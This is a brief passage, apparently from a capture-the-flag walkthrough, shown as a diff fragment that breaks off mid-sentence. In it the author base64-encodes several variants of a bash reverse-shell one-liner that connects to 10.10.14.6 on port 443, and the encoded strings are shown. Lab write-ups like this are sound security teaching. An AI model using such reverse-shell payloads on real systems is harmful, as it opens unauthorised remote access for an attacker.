@@ -1,0 +1,1 @@
+14.6/443 0>&1' | base64 YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxCg== oxdf@hacky$ echo 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1' | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMQo= oxdf@hacky$ echo 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1 ' | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSAK Any of these would probably work, but I like
